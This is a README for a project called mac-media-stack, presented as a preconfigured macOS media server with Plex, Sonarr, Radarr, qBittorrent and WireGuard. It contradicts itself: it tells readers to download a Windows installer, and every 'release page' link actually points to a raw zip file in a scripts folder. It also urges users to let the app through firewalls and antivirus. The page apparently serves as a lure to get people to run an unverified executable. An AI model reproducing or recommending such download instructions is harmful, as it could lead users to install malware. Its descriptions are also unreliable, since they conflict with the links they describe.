# 🎬 mac-media-stack - Easy Media Server Setup for macOS

[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)

---

mac-media-stack is a self-hosted media server designed for macOS. It brings together Plex, Sonarr, Radarr, Prowlarr, qBittorrent, Bazarr, and more. These apps come pre-configured with VPN and auto-healing features. This guide will help you download and run the software on a Windows computer to manage your macOS media server.

## 🖥️ System Requirements

Before you start, make sure your system meets these requirements:

- Windows 10 or newer (64-bit).
- At least 8 GB of RAM.
- 20 GB free disk space to install and run the software.
- Internet connection for downloading and updates.
- macOS device available on the same network to host the media stack.

## 🔗 Download mac-media-stack

Click the link below to visit the page where you can download the software files.

[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-green)](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)

This link will take you to the release page. Look for the latest version and download the Windows installer file or the Docker setup if you plan to use Docker Desktop.

## 🚀 How To Download and Install

1. Visit the release page using the above link.

2. Find the latest version. The releases are marked by version numbers like v1.0, v1.1, and so on.

3. Under the latest release, look for a Windows installer file. It usually ends with `.exe` or `.msi`. Download this file.

4. Once downloaded, double-click the installer file to start.

5. Follow the installation prompts. For most users, the default settings will work fine.

6. The installer will place mac-media-stack on your computer and set up necessary files.

## ⚙️ Setting Up the Application

After installing, open the app from the Start menu or desktop shortcut.

The software will connect to your macOS media server over your network. It handles Plex and other apps automatically. It also sets up a VPN connection and checks itself regularly to fix any issues.

To connect correctly:

- Ensure your macOS device is powered on and connected to the same network.

- Have your macOS device’s local IP address handy. You may find this in your router’s device list or on the Mac itself under System Preferences > Network.

- Enter the IP address in the mac-media-stack app when prompted.

The app comes pre-configured, so you do not need to tweak settings unless you want to.

## 🛠️ Using the Media Stack Components

mac-media-stack includes several key media tools, all ready to use:

- **Plex**: For streaming your media anywhere.

- **Sonarr**: Helps you find and download TV shows.

- **Radarr**: Finds and downloads movies automatically.

- **Prowlarr**: Connects various indexers for Sonarr and Radarr.

- **qBittorrent**: Manages your torrent downloads.

- **Bazarr**: Downloads subtitles for your media.

All these run on your macOS device but can be managed remotely from your Windows PC via the app.

The software uses Docker and Docker Compose under the hood to keep everything organized. You don’t need to install or manage Docker yourself unless you prefer manual control.

## 🔄 Automatic Updates and Healing

The app keeps your media stack up to date:

- Checks for updates every day.

- Downloads and installs updates automatically.

- Fixes common issues without user input.

This ensures your media server runs smoothly with minimal effort from you.

## 📡 VPN Setup

mac-media-stack includes a WireGuard VPN connection. This adds security and privacy when accessing your media remotely.

The VPN is configured during installation. You just need to:

- Allow required permissions if prompted.

- Connect or disconnect VPN from the app interface.

This makes streaming with Plex and other tools secure.

## 🧰 Troubleshooting Tips

If you face issues, try these steps:

- Restart your Windows PC and macOS device.

- Check that both devices are on the same network.

- Verify that your firewall or antivirus allows the app to access the network.

- Ensure the local IP of your macOS device is correct in the app.

- Consult the app’s log files, accessible under the settings menu, for error details.

- Use the built-in repair tools to fix broken components.

## 📚 Where To Go From Here

You can explore the following once setup completes:

- Adding more media libraries in Plex.

- Customizing Sonarr and Radarr to suit your preferences.

- Managing torrents directly in qBittorrent.

- Using Bazarr to keep subtitles in sync.

All management happens on the macOS device but can be controlled remotely via this Windows app.

## 📥 Download Link Reminder

Use the following link to access the latest releases, download installers, and update your software:

[https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)

Click the link, choose the latest release, download the Windows installer, and run it to start.